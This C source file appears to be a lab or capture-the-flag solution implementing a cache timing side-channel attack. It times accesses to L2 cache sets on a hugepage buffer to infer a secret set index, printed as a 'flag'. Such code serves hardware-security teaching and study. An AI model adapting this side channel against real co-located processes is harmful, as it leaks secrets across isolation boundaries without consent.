#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_SIZE (2 * 1024 * 1024) // 2MB Hugepage
#define L2_CACHE_SETS 2048          // Number of L2 cache sets on Skylake
#define SAMPLE_RUNS 100             // Increase number of samples to average timings
#define ADDRESSES_PER_SET 8         // Probe multiple addresses per set

// Function to compute average access time for a specific cache set
uint64_t probe_set(volatile uint8_t *buf, int set_index) {
    uint64_t total_time = 0;

    for (int i = 0; i < SAMPLE_RUNS; i++) {
        for (int j = 0; j < ADDRESSES_PER_SET; j++) {
            volatile uint8_t *addr = buf + (set_index * 64) + (j * 4096);
            total_time += measure_one_block_access_time((uint64_t)addr);
        }
    }
    return total_time / (SAMPLE_RUNS * ADDRESSES_PER_SET);
}

int main(int argc, char const *argv[]) {
    int flag = -1;

    // Step 1: Allocate a hugepage buffer
    volatile uint8_t *buf = (volatile uint8_t *) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap error");
        exit(1);
    }

    // Dummy write to ensure the page is allocated
    buf[0] = 1;

    printf("Attacker started. Monitoring cache sets...\n");

    uint64_t timings[L2_CACHE_SETS];

    while (1) {
        // Step 2: Measure access time for each set
        for (int set = 0; set < L2_CACHE_SETS; set++) {
            timings[set] = probe_set(buf, set);
        }

        // Step 3: Find the slowest access set (highest latency)
        uint64_t max_time = 0;
        int candidate_flag = -1;

        for (int set = 0; set < L2_CACHE_SETS; set++) {
            if (timings[set] > max_time) {
                max_time = timings[set];
                candidate_flag = set;
            }
        }

        // Basic filtering to avoid noise: only print if confident
        if (max_time > 150) { // lower threshold because averaging more
            flag = candidate_flag;
            printf("Flag: %d\n", flag);
            break; // Successfully found the flag, exit
        }

        usleep(500); // Sleep 0.5ms and try again if not confident
    }

    return 0;
}